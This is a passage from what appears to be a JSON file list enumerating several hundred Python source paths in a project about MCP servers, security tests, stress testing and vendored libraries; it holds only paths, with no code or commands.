          "test_env/lib/python3.12/site-packages/pip/_vendor/rich/progress.py",
          "mcp_learning_system/servers/bash_god/optimization/engine.py",
          "mcp_learning_system/stress_testing/benchmarks/cross_instance_benchmark.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/svm/_base.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/core/dtypes/inference.py",
          "test_env/lib/python3.12/site-packages/twisted/conch/client/agent.py",
          "test_env/lib/python3.12/site-packages/pydantic/json_schema.py",
          "test_env/lib/python3.12/site-packages/psutil/_pswindows.py",
          "mcp_learning_system/python_learning/mcp_learning/metrics.py",
          "test_env/lib/python3.12/site-packages/httpcore/_async/connection_pool.py",
          "test_environments/circle_experts/experts/chaos_expert.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/testing/suite/test_dialect.py",
          "src/utils/imports.py",
          "rust_core/security_audit_env/mcp_learning_system/python_learning/mcp_learning/learning.py",
          "mcp_learning_system/learning_core/cross_instance.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/core/arrays/masked.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/pyparsing/diagram/__init__.py",
          "src/utils/git.py",
          "mcp_learning_system/bash_god_orchestrator.py",
          "src/security/mcp_security_core.py",
          "test_env/lib/python3.12/site-packages/twisted/mail/test/test_smtp.py",
          "mcp_servers/src/core/optimized_base_server.py",
          "test_env/lib/python3.12/site-packages/twisted/spread/jelly.py",
          "mcp_learning_system/servers/bash_god/python_src/context_analyzer.py",
          "test_env/lib/python3.12/site-packages/twisted/names/resolve.py",
          "test_env/lib/python3.12/site-packages/twisted/internet/test/test_socket.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/ensemble/_stacking.py",
          "mcp_learning_system/stress_testing/benchmarks/memory_benchmark.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/stats/_sensitivity_analysis.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/cross_decomposition/_pls.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/rich/_ratio.py",
          "test_env/lib/python3.12/site-packages/twisted/internet/test/test_process.py",
          "test_env/lib/python3.12/site-packages/pydantic/errors.py",
          "test_env/lib/python3.12/site-packages/rich/console.py",
          "backup_agent3_20250607_010225/src/core/stream_processor.py",
          "src/mcp/performance_validator.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/orm/relationships.py",
          "test_env/lib/python3.12/site-packages/twisted/application/internet.py",
          "monitoring/mcp_tracing.py",
          "test_env/lib/python3.12/site-packages/pydantic/_internal/_fields.py",
          "test_env/lib/python3.12/site-packages/twisted/python/_shellcomp.py",
          "test_env/lib/python3.12/site-packages/twisted/application/test/test_internet.py",
          "test_env/lib/python3.12/site-packages/automat/_methodical.py",
          "test_env/lib/python3.12/site-packages/pydantic/plugin/__init__.py",
          "test_env/lib/python3.12/site-packages/twisted/conch/scripts/conch.py",
          "test_env/lib/python3.12/site-packages/twisted/mail/_pop3client.py",
          "test_env/lib/python3.12/site-packages/pydantic/_internal/_generate_schema.py",
          "test_env/lib/python3.12/site-packages/twisted/protocols/memcache.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/S_V_G_.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/rich/console.py",
          "test_env/lib/python3.12/site-packages/anyio/_core/_resources.py",
          "rust_core/security_audit_env/mcp_learning_system/stress_testing/scenarios/memory_efficiency.py",
          "test_env/lib/python3.12/site-packages/cryptography/x509/extensions.py",
          "rust_core/security_audit_env/mcp_learning_system/python_learning/mcp_learning/shared_memory.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_internal/utils/logging.py",
          "test_env/lib/python3.12/site-packages/incremental/__init__.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/testing/engines.py",
          "test_env/lib/python3.12/site-packages/dotenv/variables.py",
          "test_env/lib/python3.12/site-packages/twisted/conch/test/keydata.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/designspaceLib/types.py",
          "src/auth/models.py",
          "test_env/lib/python3.12/site-packages/httpcore/_backends/mock.py",
          "test_env/lib/python3.12/site-packages/anyio/_core/_subprocesses.py",
          "test_env/lib/python3.12/site-packages/pygments/lexers/_php_builtins.py",
          "test_env/lib/python3.12/site-packages/tortoise/contrib/pylint/__init__.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/rich/table.py",
          "src/mcp/connection_optimizer.py",
          "test_environments/automation/execution_engine.py",
          "tests/test_reliability_and_chaos.py",
          "rust_core/security_audit_env/mcp_learning_system/learning_core/pattern_recognition.py",
          "test_env/lib/python3.12/site-packages/pip/_vendor/pygments/style.py",
          "test_env/lib/python3.12/site-packages/dataclasses_json/core.py",
          "test_env/lib/python3.12/site-packages/pygments/lexers/other.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/covariance/_empirical_covariance.py",
          "src/auth/tokens.py",
          "test_environments/circle_experts/experts/scalability_expert.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/covariance/_elliptic_envelope.py",
          "mcp_learning_system/bash_god_security_commands.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_internal/utils/logging.py",
          "test_env/lib/python3.12/site-packages/tortoise/backends/oracle/executor.py",
          "test_env/lib/python3.12/site-packages/anyio/abc/_tasks.py",
          "deploy_mcp_production.py",
          "test_env/lib/python3.12/site-packages/pygments/lexers/matlab.py",
          "src/auth/rbac.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/rich/pretty.py",
          "test_env/lib/python3.12/site-packages/pygments/lexers/jvm.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/orm/_typing.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/sql/_elements_constructors.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/typing_extensions.py",
          "test_env/lib/python3.12/site-packages/twisted/internet/base.py",
          "test_real_mcp_performance.py",
          "code-base-crawler/code-base-crawler/simple_error_test.py",
          "mcp_learning_system/learning_core/pattern_recognition.py",
          "mcp_learning_system/learning_core/prediction_engine.py",
          "src/api/config.py",
          "test_environments/load_generators/patterns/pattern_engine.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/testing/fixtures/orm.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/orm/mapper.py",
          "test_env/lib/python3.12/site-packages/twisted/trial/test/test_assertions.py",
          "test_env/lib/python3.12/site-packages/twisted/test/test_process.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/core/computation/engines.py",
          "test_env/lib/python3.12/site-packages/twisted/conch/test/test_checkers.py",
          "test_environments/load_generators/custom_scenario_builder.py",
          "rust_core/security_audit_env/mcp_learning_system/learning_core/models.py",
          "test_authentication_bypass_fixes.py",
          "test_env/lib/python3.12/site-packages/cryptography/hazmat/primitives/asymmetric/x448.py",
          "test_env/lib/python3.12/site-packages/twisted/web/_flatten.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/sql/type_api.py",
          "test_final_security_validation.py",
          "test_env/lib/python3.12/site-packages/twisted/test/test_ftp.py",
          "test_env/lib/python3.12/site-packages/twisted/web/test/test_agent.py",
          "test_env/lib/python3.12/site-packages/pip/_internal/self_outdated_check.py",
          "test_env/lib/python3.12/site-packages/tortoise/validators.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/dialects/__init__.py",
          "test_env/lib/python3.12/site-packages/pydantic/_internal/_mock_val_ser.py",
          "test_env/lib/python3.12/site-packages/twisted/internet/_resolver.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/packaging/specifiers.py",
          "mcp_learning_system/servers/bash_god/python_src/command_predictor.py",
          "test_environments/automation/test_orchestrator.py",
          "test_environments/resource_scaling_matrix.py",
          "test_environments/stress_testing/core/adaptive_ramping.py",
          "benchmarks/load_testing_suite.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/ext/asyncio/session.py",
          "src/auth/audit.py",
          "src/monitoring/alerts.py",
          "rust_core/security_audit_env/mcp_learning_system/servers/devops/automation/auto_scaling.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/stats/_multicomp.py",
          "test_env/lib/python3.12/site-packages/pydantic/functional_serializers.py",
          "mcp_learning_system/bash_god_mcp_server.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/ext/asyncio/engine.py",
          "test_env/lib/python3.12/site-packages/twisted/web/test/requesthelper.py",
          "mcp_learning_system/python_learning/mcp_learning/learning.py",
          "code-base-crawler/code-base-crawler/production_validation_suite.py",
          "test_env/lib/python3.12/site-packages/packaging/specifiers.py",
          "test_environments/chaos_engineering/expert_chaos_controller.py",
          "test_env/lib/python3.12/site-packages/pip/_vendor/pygments/lexers/python.py",
          "test_env/lib/python3.12/site-packages/mako/testing/config.py",
          "test_env/lib/python3.12/site-packages/h11/_events.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/rich/progress.py",
          "tests/framework/hardware_optimized_orchestrator.py",
          "test_env/lib/python3.12/site-packages/_pytest/config/__init__.py",
          "test_env/lib/python3.12/site-packages/pygments/lexer.py",
          "test_env/lib/python3.12/site-packages/anyio/streams/tls.py",
          "test_env/lib/python3.12/site-packages/twisted/internet/interfaces.py",
          "tests/utils/memory_profiler.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/frame/test_constructors.py",
          "test_environments/monitoring/analytics_engine.py",
          "code-base-crawler/code-base-crawler/anam_py/src/anam_py/crawler.py",
          "src/auth/__init__.py",
          "test_environments/circle_experts/analysis_engine.py",
          "mcp_servers/templates/python-server.py",
          "src/monitoring/memory_alerts.py",
          "test_env/lib/python3.12/site-packages/pydantic/_internal/_config.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/dialects/mysql/mysqlconnector.py",
          "test_environments/scaling/scaling_orchestrator.py",
          "test_env/lib/python3.12/site-packages/starlette/formparsers.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/lib/tests/test_loadtxt.py",
          "test_env/lib/python3.12/site-packages/annotated_types/__init__.py",
          "test_env/lib/python3.12/site-packages/twisted/conch/client/default.py",
          "chaos_engineering_validation.py",
          "test_env/lib/python3.12/site-packages/cssutils/css/selector.py",
          "test_env/lib/python3.12/site-packages/httpcore/_async/http_proxy.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/util/retry.py",
          "tests/production_testing_suite.py",
          "src/mcp/deployment/health_validator.py",
          "rust_core/security_audit_env/mcp_learning_system/python_learning/mcp_learning/algorithms.py",
          "test_env/lib/python3.12/site-packages/twisted/test/test_udp.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/six.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/designspaceLib/statNames.py",
          "test_env/lib/python3.12/site-packages/_pytest/mark/structures.py",
          "src/auth/user_manager.py",
          "test_env/lib/python3.12/site-packages/twisted/conch/scripts/cftp.py",
          "rust_core/security_audit_env/mcp_learning_system/servers/bash_god/python_src/learning.py",
          "src/mcp/performance.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/testing/provision.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/testing/suite/test_insert.py",
          "test_environments/mcp_integration/service_discovery.py",
          "test_env/lib/python3.12/site-packages/pydantic/v1/main.py",
          "test_environments/stress_testing/core/safety_manager.py",
          "src/core/cleanup_scheduler.py",
          "test_agent8_standalone_integration.py",
          "test_environments/circle_experts/consensus_engine.py",
          "test_env/lib/python3.12/site-packages/setuptools/_vendor/packaging/_tokenizer.py",
          "rust_core/security_audit_env/mcp_learning_system/servers/development/python_src/learning.py",
          "test_env/lib/python3.12/site-packages/coverage/results.py",
          "test_env/lib/python3.12/site-packages/zope/interface/tests/advisory_testing.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/ext/automap.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/rich/_ratio.py",
          "test_env/lib/python3.12/site-packages/twisted/mail/imap4.py",
          "src/core/parallel_executor.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/typing_extensions.py",
          "test_env/lib/python3.12/site-packages/setuptools/_vendor/packaging/specifiers.py",
          "backup_agent3_20250607_010225/src/mcp/communication/slack_server.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/tests/test_simplification.py",
          "test_env/lib/python3.12/site-packages/coverage/html.py",
          "test_env/lib/python3.12/site-packages/_pytest/python.py",
          "test_env/lib/python3.12/site-packages/fastapi/dependencies/models.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/common.py",
          "test_advanced_security_mitigations.py",
          "mcp_learning_system/stress_testing/benchmarks/learning_benchmark.py",
          "test_env/lib/python3.12/site-packages/h11/_state.py",
          "test_env/lib/python3.12/site-packages/twisted/internet/test/test_posixbase.py",
          "deploy_mcp_servers.py",
          "test_env/lib/python3.12/site-packages/httpx/_transports/base.py",
          "test_env/lib/python3.12/site-packages/twisted/internet/utils.py",
          "test_env/lib/python3.12/site-packages/twisted/conch/test/test_recvline.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/ext/mypy/plugin.py",
          "src/core/connections.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_internal/utils/logging.py",
          "src/circle_of_experts/experts/expert_factory.py",
          "test_env/lib/python3.12/site-packages/mako/testing/_config.py",
          "test_env/lib/python3.12/site-packages/pydantic/dataclasses.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_internal/models/link.py",
          "test_env/lib/python3.12/site-packages/twisted/trial/reporter.py",
          "test_env/lib/python3.12/site-packages/twisted/internet/test/test_endpoints.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/packaging/_tokenizer.py",
          "test_environments/automation/scheduler.py",
          "mcp_learning_system/learning_core/adaptive_learning.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/stats/_relative_risk.py",
          "backup_agent3_20250607_010225/src/core/gc_optimization.py",
          "backup_agent3_20250607_010225/src/core/retry.py",
          "test_environments/mcp_integration/node_monitor.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_internal/self_outdated_check.py",
          "tests/mocks/mcp_server_mocks.py",
          "rust_core/security_audit_env/mcp_learning_system/servers/bash_god/python_src/command_predictor.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/dialects/mysql/reserved_words.py",
          "src/utils/monitoring.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/series/accessors/test_struct_accessor.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/pygments/lexers/_mapping.py",
          "test_security_mitigations.py",
          "test_env/lib/python3.12/site-packages/twisted/web/test/test_newclient.py",
          "src/core/ssrf_protection.py",
          "src/utils/security.py",
          "mcp_servers/src/core/base_server.py",
          "backup_agent3_20250607_010225/src/mcp/manager.py",
          "test_environments/circle_experts/adaptive_controller.py",
          "tests/utils/statistical_analyzer.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/sql/sqltypes.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_internal/models/link.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/stats/_axis_nan_policy.py",
          "test_mcp_auth.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/psutil/_pswindows.py",
          "test_env/lib/python3.12/site-packages/rich/progress.py",
          "code-base-crawler/parallel_development_orchestrator.py",
          "mcp_learning_system/bash_god_mcp_server_backup_20250608_183022.py",
          "test_env/lib/python3.12/site-packages/fastapi/_compat.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_internal/distributions/base.py",
          "test_env/lib/python3.12/site-packages/setuptools/_vendor/wheel/vendored/packaging/_tokenizer.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/six.py",
          "test_env/lib/python3.12/site-packages/anyio/streams/text.py",
          "test_env/lib/python3.12/site-packages/_pytest/timing.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/rich/pretty.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/lib/tests/test_loadtxt.py",
          "test_env/lib/python3.12/site-packages/zope/interface/tests/test_declarations.py",
          "test_env/lib/python3.12/site-packages/pygments/lexers/python.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/typing_extensions.py",
          "test_env/lib/python3.12/site-packages/twisted/conch/client/connect.py",
          "test_env/lib/python3.12/site-packages/attr/_next_gen.py",
          "test_environments/load_generators/profiles/workload_profiles.py",
          "test_env/lib/python3.12/site-packages/pygments/lexers/_mapping.py",
          "test_env/lib/python3.12/site-packages/_pytest/mark/__init__.py",
          "test_env/lib/python3.12/site-packages/httpcore/_backends/base.py",
          "test_env/lib/python3.12/site-packages/twisted/mail/smtp.py",
          "test_env/lib/python3.12/site-packages/pygments/lexers/ncl.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/decomposition/_base.py",
          "test_env/lib/python3.12/site-packages/pydantic/annotated_handlers.py",
          "test_env/lib/python3.12/site-packages/pip/_vendor/rich/_ratio.py",
          "src/mcp/scaling_advisor.py",
          "comprehensive_documentation_validator.py",
          "test_env/lib/python3.12/site-packages/twisted/mail/relaymanager.py",
          "test_env/lib/python3.12/site-packages/twisted/mail/alias.py",
          "test_env/lib/python3.12/site-packages/httpx/_status_codes.py",
          "test_memory_standalone.py",
          "test_env/lib/python3.12/site-packages/tortoise/contrib/pydantic/descriptions.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/otlLib/optimize/gpos.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/integrate/_cubature.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/dialects/oracle/base.py",
          "test_env/lib/python3.12/site-packages/psutil/tests/test_bsd.py",
          "test_env/lib/python3.12/site-packages/twisted/words/service.py",
          "test_environments/chaos_engineering/recovery_measurer.py",
          "test_rbac_direct.py",
          "mcp_learning_system/real_validation_framework.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/rich/table.py",
          "test_env/lib/python3.12/site-packages/markdown_it/_compat.py",
          "test_env/lib/python3.12/site-packages/_pytest/_io/pprint.py",
          "test_env/lib/python3.12/site-packages/setuptools/_vendor/inflect/__init__.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_internal/distributions/base.py",
          "test_env/lib/python3.12/site-packages/coverage/plugin.py",
          "test_env/lib/python3.12/site-packages/pip/_vendor/distro/distro.py",
          "tests/performance/mcp_stress_testing.py",
          "test_env/lib/python3.12/site-packages/fastapi/dependencies/utils.py",
          "test_env/lib/python3.12/site-packages/twisted/internet/test/test_defer_await.py",
          "test_env/lib/python3.12/site-packages/twisted/mail/test/test_imap.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_internal/distributions/base.py",
          "test_environments/circle_experts/strategy_selector.py",
          "simple_mcp_test.py",
          "rust_core/security_audit_env/mcp_learning_system/learning_core/optimization.py",
          "test_env/lib/python3.12/site-packages/twisted/logger/_logger.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/pyparsing/diagram/__init__.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/core/internals/construction.py",
          "test_env/lib/python3.12/site-packages/anyio/lowlevel.py",
          "test_env/lib/python3.12/site-packages/twisted/conch/test/test_default.py",
          "test_env/lib/python3.12/site-packages/pip/_vendor/rich/console.py",
          "src/mcp/security/auth_middleware.py",
          "src/core/mcp_cache.py",
          "test_env/lib/python3.12/site-packages/pydantic/_internal/_core_utils.py",
          "test_environments/mcp_integration/test_distributor.py",
          "test_env/lib/python3.12/site-packages/typing_inspection/introspection.py",
          "test_env/lib/python3.12/site-packages/pydantic/v1/json.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/naive_bayes.py",
          "src/mcp/protocols.py",
          "test_env/lib/python3.12/site-packages/_pytest/warning_types.py",
          "full_stack_review.py",
          "test_environments/monitoring/collectors/system_metrics.py",
          "tests/security/comprehensive_security_tests.py",
          "test_env/lib/python3.12/site-packages/httpcore/_async/http11.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/rich/progress.py",
          "backup_agent3_20250607_010225/src/mcp/communication/hub_server.py",
          "test_environments/mcp_integration/orchestrator.py",
          "modularity_analysis.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/rich/table.py",
          "scripts/production_readiness_validator.py",
          "test_env/lib/python3.12/site-packages/pydantic/main.py",
          "test_env/lib/python3.12/site-packages/pypika_tortoise/dialects/oracle.py",
          "test_environments/scaling/resource_manager.py",
          "test_env/lib/python3.12/site-packages/twisted/internet/test/test_inlinecb.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/ensemble/_gb.py",
          "test_mcp_servers_simplified.py",
          "monitoring/mcp_health_checks.py",
          "rust_core/security_audit_env/mcp_learning_system/servers/bash_god/python_src/chain_optimizer.py",
          "test_env/lib/python3.12/site-packages/rich/_ratio.py",
          "backup_agent3_20250607_010225/src/core/ssrf_protection.py",
          "rust_core/security_audit_env/mcp_learning_system/stress_testing/scenarios/cross_instance_stress.py",
          "test_environments/monitoring/collectors/application_metrics.py",
          "test_env/lib/python3.12/site-packages/anyio/_core/_sockets.py",
          "test_env/lib/python3.12/site-packages/cryptography/hazmat/primitives/asymmetric/x25519.py",
          "test_environments/scaling/providers/aws_scaler.py",
          "test_env/lib/python3.12/site-packages/twisted/spread/publish.py",
          "mcp_servers/mcp_api_integration_server.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/six.py",
          "test_env/lib/python3.12/site-packages/pydantic/v1/env_settings.py",
          "test_env/lib/python3.12/site-packages/pip/_vendor/typing_extensions.py",
          "test_env/lib/python3.12/site-packages/twisted/test/test_internet.py",
          "mcp_learning_system/python_learning/mcp_learning/patterns.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/orm/properties.py",
          "test_environments/load_generators/generators/cpu_load_generator.py",
          "tests/framework/ffi_integration_tester.py",
          "test_env/lib/python3.12/site-packages/twisted/words/test/test_basesupport.py",
          "tests/framework/performance_testing.py",
          "test_env/lib/python3.12/site-packages/pygments/lexers/_lasso_builtins.py",
          "stress_cycle_validation.py",
          "test_env/lib/python3.12/site-packages/twisted/conch/test/test_userauth.py",
          "test_env/lib/python3.12/site-packages/pygments/lexers/varnish.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/joblib/test/test_cloudpickle_wrapper.py",
          "test_env/lib/python3.12/site-packages/coverage/regions.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/pygments/lexer.py",
          "test_env/lib/python3.12/site-packages/twisted/conch/telnet.py",
          "code-base-crawler/code-base-crawler/anam_py/src/anam_py/multi_agent.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/dialects/oracle/vector.py",
          "test_env/lib/python3.12/site-packages/setuptools/_vendor/wheel/vendored/packaging/specifiers.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/mixture/_base.py",
          "test_env/lib/python3.12/site-packages/pygments/lexers/dsls.py",
          "test_env/lib/python3.12/site-packages/pygments/lexers/_csound_builtins.py",
          "mcp_learning_system/servers/devops/python_src/learning.py",
          "mcp_learning_system/stress_testing/scenarios/memory_efficiency.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_internal/models/link.py",
          "src/core/stream_processor.py",
          "test_env/lib/python3.12/site-packages/twisted/web/test/test_http2.py",
          "test_environments/circle_experts/test_orchestrator.py",
          "test_env/lib/python3.12/site-packages/pydantic/v1/_hypothesis_plugin.py",
          "test_environments/load_generators/generators/io_load_generator.py",
          "test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/packages/six.py",
          "test_env/lib/python3.12/site-packages/pypika_tortoise/enums.py",
          "test_env/lib/python3.12/site-packages/twisted/internet/test/connectionmixins.py",
          "test_env/lib/python3.12/site-packages/twisted/test/test_ssl.py",
          "test_env/lib/python3.12/site-packages/pip/_vendor/pyparsing/diagram/__init__.py",
          "test_env/lib/python3.12/site-packages/uvloop/_testbase.py",
          "test_env/lib/python3.12/site-packages/pygments/style.py",
          "test_env/lib/python3.12/site-packages/twisted/names/server.py",
          "test_env/lib/python3.12/site-packages/twisted/mail/pb.py",
          "mcp_simple_performance_validation.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/orm/decl_base.py",
          "mcp_learning_system/add_massive_commands.py",
          "test_env/lib/python3.12/site-packages/twisted/web/_auth/wrapper.py",
          "test_env/lib/python3.12/site-packages/alembic/ddl/__init__.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/random_projection.py",
          "code-base-crawler/code-base-crawler/tests/comprehensive_integration_tests.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/tests/test_metadata_routing.py",
          "test_env/lib/python3.12/site-packages/twisted/conch/ssh/transport.py",
          "rust_core/security_audit_env/mcp_learning_system/stress_testing/reports/performance_optimization_report.py",
          "test_env/lib/python3.12/site-packages/setuptools/_vendor/typeguard/_config.py",
          "test_env/lib/python3.12/site-packages/twisted/conch/ssh/agent.py",
          "comprehensive_test_suite.py",
          "test_env/lib/python3.12/site-packages/pydantic/v1/fields.py",
          "test_env/lib/python3.12/site-packages/pypika_tortoise/dialects/__init__.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_internal/models/link.py",
          "test_env/lib/python3.12/site-packages/mypy_extensions.py",
          "test_env/lib/python3.12/site-packages/pytest_mock/plugin.py",
          "code-base-crawler/code-base-crawler/tensor_mem_ai/tensor_mem_ai/tools.py",
          "mcp_learning_system/servers/development/python_src/dependency_predictor.py",
          "test_env/lib/python3.12/site-packages/zope/interface/declarations.py",
          "test_rbac_simple.py",
          "tests/circle_of_experts/test_performance.py",
          "test_env/lib/python3.12/site-packages/pygments/lexers/shell.py",
          "test_env/lib/python3.12/site-packages/pygments/lexers/_cocoa_builtins.py",
          "test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/util/retry.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/util/retry.py",
          "mcp_learning_system/security_monitoring_expansion.py",
          "test_env/lib/python3.12/site-packages/alembic/ddl/oracle.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/orm/context.py",
          "rust_core/security_audit_env/mcp_learning_system/servers/bash_god/optimization/engine.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/dialects/postgresql/ranges.py",
          "test_env/lib/python3.12/site-packages/pydantic/_internal/_signature.py",
          "mcp_learning_system/bash_god_mcp_server_backup_20250608_184615.py",
          "test_env/lib/python3.12/site-packages/twisted/names/test/test_dns.py",
          "tests/mcp_security_testing.py",
          "tests/performance/regression_test_suite.py",
          "test_env/lib/python3.12/site-packages/pygments/lexers/phix.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/joblib/test/test_parallel.py",
          "test_env/lib/python3.12/site-packages/tortoise/expressions.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/dialects/oracle/dictionary.py",
          "mcp_learning_system/learning_core/models.py",
          "test_env/lib/python3.12/site-packages/twisted/test/test_unix.py",
          "test_env/lib/python3.12/site-packages/cryptography/x509/base.py",
          "test_bash_god_comprehensive.py",
          "test_env/lib/python3.12/site-packages/pydantic/_internal/_typing_extra.py",
          "test_env/lib/python3.12/site-packages/twisted/python/test/test_sendmsg.py",
          "test_env/lib/python3.12/site-packages/pygments/lexers/apdlexer.py",
          "tests/memory/test_gc_performance.py",
          "mcp_learning_system/servers/development/python_src/learning.py",
          "src/core/cache_config.py",
          "test_environments/stress_testing/core/metrics_collector.py",
          "backup_agent3_20250607_010225/docs/api/clients/python-client.py",
          "rust_core/security_audit_env/mcp_learning_system/servers/development/python_src/dependency_predictor.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/orm/decl_api.py",
          "test_env/lib/python3.12/site-packages/twisted/test/test_cooperator.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/ensemble/_forest.py",
          "mcp_learning_system/comprehensive_validation.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/ext/asyncio/base.py",
          "mcp_learning_system/servers/bash_god/commands/library.py",
          "test_circuit_breaker_standalone.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/utils/_tags.py",
          "rust_core/security_audit_env/mcp_learning_system/python_learning/mcp_learning/patterns.py",
          "test_environments/stress_testing/interfaces/control_api.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/orm/descriptor_props.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/engine/default.py",
          "test_env/lib/python3.12/site-packages/cryptography/x509/general_name.py",
          "test_env/lib/python3.12/site-packages/twisted/web/_newclient.py",
